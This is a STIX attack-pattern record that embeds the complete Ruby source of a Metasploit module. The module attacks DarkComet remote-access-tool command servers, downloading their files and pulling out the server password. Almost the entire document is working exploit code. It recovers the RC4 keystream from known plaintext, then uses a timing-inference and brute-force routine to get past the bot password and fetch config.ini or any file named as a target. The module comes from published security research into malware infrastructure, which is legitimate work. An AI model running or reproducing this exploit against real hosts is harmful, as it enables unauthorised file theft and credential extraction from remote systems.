{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--71bd2329-a0c1-4557-bf21-173aa04737c9",
    "created": "2024-08-14T16:31:40.83446Z",
    "modified": "2024-08-14T16:31:40.834464Z",
    "name": "DarkComet Server Remote File Download Exploit",
    "description": " This module exploits an arbitrary file download vulnerability in the DarkComet C&C server versions 3.2 and up. The exploit does not need to know the password chosen for the bot/server communication.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/darkcomet_filedownloader.rb",
            "external_id": "darkcomet_filedownloader.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.nccgroup.com/globalassets/our-research/us/whitepapers/PEST-CONTROL.pdf"
        },
        {
            "source_name": "reference",
            "url": "http://samvartaka.github.io/exploitation/2016/06/03/dead-rats-exploiting-malware"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DarkComet Server Remote File Download Exploit',\n      'Description'    => %q{\n        This module exploits an arbitrary file download vulnerability in the DarkComet C&C server versions 3.2 and up.\n        The exploit does not need to know the password chosen for the bot/server communication.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Shawn Denbow & Jesse Hertz', # Vulnerability Discovery\n          'Jos Wetzels' # Metasploit module, added support for versions < 5.1, removed need to know password via cryptographic attack\n        ],\n      'References'     =>\n        [\n          [ 'URL', 'https://www.nccgroup.com/globalassets/our-research/us/whitepapers/PEST-CONTROL.pdf' ],\n          [ 'URL', 'http://samvartaka.github.io/exploitation/2016/06/03/dead-rats-exploiting-malware' ]\n        ],\n      'DisclosureDate' => '2012-10-08',\n      'Platform'       => 'win'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(1604),\n        Opt::RHOST('0.0.0.0'),\n\n        OptAddressLocal.new('LHOST', [true, 'This is our IP (as it appears to the DarkComet C2 server)', '0.0.0.0']),\n        OptString.new('KEY', [false, 'DarkComet RC4 key (include DC prefix with key eg. #KCMDDC51#-890password)', '']),\n        OptBool.new('NEWVERSION', [false, 'Set to true if DarkComet version >= 5.1, set to false if version < 5.1', true]),\n        OptString.new('TARGETFILE', [false, 'Target file to download (assumes password is set)', '']),\n        OptBool.new('STORE_LOOT', [false, 'Store file in loot (will simply output file to console if set to false).', true]),\n        OptInt.new('BRUTETIMEOUT', [false, 'Timeout (in seconds) for bruteforce attempts', 1])\n\n      ])\n  end\n\n  # Functions for XORing two strings, deriving keystream using known plaintext and applying keystream to produce ciphertext\n  def xor_strings(s1, s2)\n    s1.unpack('C*').zip(s2.unpack('C*')).map { |a, b| a ^ b }.pack('C*')\n  end\n\n  def get_keystream(ciphertext, known_plaintext)\n    c = [ciphertext].pack('H*')\n    if known_plaintext.length > c.length\n      return xor_strings(c, known_plaintext[0, c.length])\n    elsif c.length > known_plaintext.length\n      return xor_strings(c[0, known_plaintext.length], known_plaintext)\n    else\n      return xor_strings(c, known_plaintext)\n    end\n  end\n\n  def use_keystream(plaintext, keystream)\n    if keystream.length > plaintext.length\n      return xor_strings(plaintext, keystream[0, plaintext.length]).unpack('H*')[0].upcase\n    else\n      return xor_strings(plaintext, keystream).unpack('H*')[0].upcase\n    end\n  end\n\n  # Use RubyRC4 functionality (slightly modified from Max Prokopiev's implementation https://github.com/maxprokopiev/ruby-rc4/blob/master/lib/rc4.rb)\n  # since OpenSSL requires at least 128-bit keys for RC4 while DarkComet supports any keylength\n  def rc4_initialize(key)\n    @q1 = 0\n    @q2 = 0\n    @key = []\n    key.each_byte { |elem| @key << elem } while @key.size < 256\n    @key.slice!(256..@key.size - 1) if @key.size >= 256\n    @s = (0..255).to_a\n    j = 0\n    0.upto(255) do |i|\n      j = (j + @s[i] + @key[i]) % 256\n      @s[i], @s[j] = @s[j], @s[i]\n    end\n  end\n\n  def rc4_keystream\n    @q1 = (@q1 + 1) % 256\n    @q2 = (@q2 + @s[@q1]) % 256\n    @s[@q1], @s[@q2] = @s[@q2], @s[@q1]\n    @s[(@s[@q1] + @s[@q2]) % 256]\n  end\n\n  def rc4_process(text)\n    text.each_byte.map { |i| (i ^ rc4_keystream).chr }.join\n  end\n\n  def dc_encryptpacket(plaintext, key)\n    rc4_initialize(key)\n    rc4_process(plaintext).unpack('H*')[0].upcase\n  end\n\n  # Try to execute the exploit\n  def try_exploit(exploit_string, keystream, bruting)\n    connect\n    idtype_msg = sock.get_once(12)\n\n    if idtype_msg.length != 12\n      disconnect\n      return nil\n    end\n\n    if datastore['KEY'] != ''\n      exploit_msg = dc_encryptpacket(exploit_string, datastore['KEY'])\n    else\n      # If we don't have a key we need enough keystream\n      if keystream.nil?\n        disconnect\n        return nil\n      end\n\n      if keystream.length < exploit_string.length\n        disconnect\n        return nil\n      end\n\n      exploit_msg = use_keystream(exploit_string, keystream)\n    end\n\n    sock.put(exploit_msg)\n\n    if bruting\n      begin\n        ack_msg = sock.timed_read(3, datastore['BRUTETIMEOUT'])\n      rescue Timeout::Error\n        disconnect\n        return nil\n      end\n    else\n      ack_msg = sock.get_once(3)\n    end\n\n    if ack_msg != \"\\x41\\x00\\x43\"\n      disconnect\n      return nil\n    # Different protocol structure for versions >= 5.1\n    elsif datastore['NEWVERSION'] == true\n      if bruting\n        begin\n          filelen = sock.timed_read(10, datastore['BRUTETIMEOUT']).to_i\n        rescue Timeout::Error\n          disconnect\n          return nil\n        end\n      else\n        filelen = sock.get_once(10).to_i\n      end\n      if filelen == 0\n        disconnect\n        return nil\n      end\n\n      if datastore['KEY'] != ''\n        a_msg = dc_encryptpacket('A', datastore['KEY'])\n      else\n        a_msg = use_keystream('A', keystream)\n      end\n\n      sock.put(a_msg)\n\n      if bruting\n        begin\n          filedata = sock.timed_read(filelen, datastore['BRUTETIMEOUT'])\n        rescue Timeout::Error\n          disconnect\n          return nil\n        end\n      else\n        filedata = sock.get_once(filelen)\n      end\n\n      if filedata.length != filelen\n        disconnect\n        return nil\n      end\n\n      sock.put(a_msg)\n      disconnect\n      return filedata\n    else\n      filedata = ''\n\n      if bruting\n        begin\n          msg = sock.timed_read(1024, datastore['BRUTETIMEOUT'])\n        rescue Timeout::Error\n          disconnect\n          return nil\n        end\n      else\n        msg = sock.get_once(1024)\n      end\n\n      while (!msg.nil?) && (msg != '')\n        filedata += msg\n        if bruting\n          begin\n            msg = sock.timed_read(1024, datastore['BRUTETIMEOUT'])\n          rescue Timeout::Error\n            break\n          end\n        else\n          msg = sock.get_once(1024)\n        end\n      end\n\n      disconnect\n\n      if filedata == ''\n        return nil\n      else\n        return filedata\n      end\n    end\n  end\n\n  # Fetch a GetSIN response from C2 server\n  def fetch_getsin\n    connect\n    idtype_msg = sock.get_once(12)\n\n    if idtype_msg.length != 12\n      disconnect\n      return nil\n    end\n\n    keystream = get_keystream(idtype_msg, 'IDTYPE')\n    server_msg = use_keystream('SERVER', keystream)\n    sock.put(server_msg)\n\n    getsin_msg = sock.get_once(1024)\n    disconnect\n    getsin_msg\n  end\n\n  # Carry out the crypto attack when we don't have a key\n  def crypto_attack(exploit_string)\n    getsin_msg = fetch_getsin\n    if getsin_msg.nil?\n      return nil\n    end\n\n    getsin_kp = 'GetSIN' + datastore['LHOST'] + '|'\n    keystream = get_keystream(getsin_msg, getsin_kp)\n\n    if keystream.length < exploit_string.length\n      missing_bytecount = exploit_string.length - keystream.length\n\n      print_status(\"Missing #{missing_bytecount} bytes of keystream ...\")\n\n      inferrence_segment = ''\n      brute_max = 4\n\n      if missing_bytecount > brute_max\n        print_status(\"Using inferrence attack ...\")\n\n        # Offsets to monitor for changes\n        target_offset_range = []\n        for i in (keystream.length + brute_max)..(keystream.length + missing_bytecount - 1)\n          target_offset_range << i\n        end\n\n        # Store inference results\n        inference_results = {}\n\n        # As long as we haven't fully recovered all offsets through inference\n        # We keep our observation window in a circular buffer with 4 slots with the buffer running between [head, tail]\n        getsin_observation = [''] * 4\n        buffer_head = 0\n\n        for i in 0..2\n          getsin_observation[i] = [fetch_getsin].pack('H*')\n          Rex.sleep(0.5)\n        end\n\n        buffer_tail = 3\n\n        # Actual inference attack happens here\n        while !target_offset_range.empty?\n          getsin_observation[buffer_tail] = [fetch_getsin].pack('H*')\n          Rex.sleep(0.5)\n\n          # We check if we spot a change within a position between two consecutive items within our circular buffer\n          # (assuming preceding entries are static in that position) we observed a 'carry', ie. our observed position went from 9 to 0\n          target_offset_range.each do |x|\n            index = buffer_head\n\n            while index != buffer_tail do\n              next_index = (index + 1) % 4\n\n              # The condition we impose is that observed character x has to differ between two observations and the character left of it has to differ in those same\n              # observations as well while being constant in at least one previous or subsequent observation\n              if (getsin_observation[index][x] != getsin_observation[next_index][x]) && (getsin_observation[index][x - 1] != getsin_observation[next_index][x - 1]) && ((getsin_observation[(index - 1) % 4][x - 1] == getsin_observation[index][x - 1]) || (getsin_observation[next_index][x - 1] == getsin_observation[(next_index + 1) % 4][x - 1]))\n                target_offset_range.delete(x)\n                inference_results[x] = xor_strings(getsin_observation[index][x], '9')\n                break\n              end\n              index = next_index\n            end\n          end\n\n          # Update circular buffer head & tail\n          buffer_tail = (buffer_tail + 1) % 4\n          # Move head to right once tail wraps around, discarding oldest item in circular buffer\n          if buffer_tail == buffer_head\n            buffer_head = (buffer_head + 1) % 4\n          end\n        end\n\n        # Inferrence attack done, reconstruct final keystream segment\n        inf_seg = [\"\\x00\"] * (keystream.length + missing_bytecount)\n        inferrence_results.each do |x, val|\n          inf_seg[x] = val\n        end\n\n        inferrence_segment = inf_seg.slice(keystream.length + brute_max, inf_seg.length).join\n        missing_bytecount = brute_max\n      end\n\n      if missing_bytecount > brute_max\n        print_status(\"Improper keystream recovery ...\")\n        return nil\n      end\n\n      print_status(\"Initiating brute force ...\")\n\n      # Bruteforce first missing_bytecount bytes of timestamp (maximum of brute_max)\n      charset = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']\n      char_range = missing_bytecount.times.map { charset }\n      char_range.first.product(*char_range[1..-1]) do |x|\n        p = x.join\n        candidate_plaintext = getsin_kp + p\n        candidate_keystream = get_keystream(getsin_msg, candidate_plaintext) + inferrence_segment\n        filedata = try_exploit(exploit_string, candidate_keystream, true)\n\n        if !filedata.nil?\n          return filedata\n        end\n      end\n      return nil\n    end\n\n    try_exploit(exploit_string, keystream, false)\n  end\n\n  def parse_password(filedata)\n    filedata.each_line { |line|\n      elem = line.strip.split('=')\n      if elem.length >= 1\n        if elem[0] == 'PASSWD'\n          if elem.length == 2\n            return elem[1]\n          else\n            return ''\n          end\n        end\n      end\n    }\n    return nil\n  end\n\n  def run\n    # Determine exploit string\n    if datastore['NEWVERSION'] == true\n      if (datastore['TARGETFILE'] != '') && (datastore['KEY'] != '')\n        exploit_string = 'QUICKUP1|' + datastore['TARGETFILE'] + '|'\n      else\n        exploit_string = 'QUICKUP1|config.ini|'\n      end\n    elsif (datastore['TARGETFILE'] != '') && (datastore['KEY'] != '')\n      exploit_string = 'UPLOAD' + datastore['TARGETFILE'] + '|1|1|'\n    else\n      exploit_string = 'UPLOADconfig.ini|1|1|'\n    end\n\n    # Run exploit\n    if datastore['KEY'] != ''\n      filedata = try_exploit(exploit_string, nil, false)\n    else\n      filedata = crypto_attack(exploit_string)\n    end\n\n    # Harvest interesting credentials, store loot\n    if !filedata.nil?\n      # Automatically try to extract password from config.ini if we haven't set a key yet\n      if datastore['KEY'] == ''\n        password = parse_password(filedata)\n        if password.nil?\n          print_status(\"Could not find password in config.ini ...\")\n        elsif password == ''\n          print_status(\"C2 server uses empty password!\")\n        else\n          print_status(\"C2 server uses password [#{password}]\")\n        end\n      end\n\n      # Store to loot\n      if datastore['STORE_LOOT'] == true\n        print_status(\"Storing data to loot...\")\n        if (datastore['KEY'] == '') && (datastore['TARGETFILE'] != '')\n          store_loot(\"darkcomet.file\", \"text/plain\", datastore['RHOST'], filedata, 'config.ini', \"DarkComet C2 server config file\")\n        else\n          store_loot(\"darkcomet.file\", \"text/plain\", datastore['RHOST'], filedata, datastore['TARGETFILE'], \"File retrieved from DarkComet C2 server\")\n        end\n      else\n        print_status(filedata.to_s)\n      end\n    else\n      print_error(\"Attack failed or empty config file encountered ...\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-10-08",
    "x_mitre_platforms": [
        "win"
    ]
}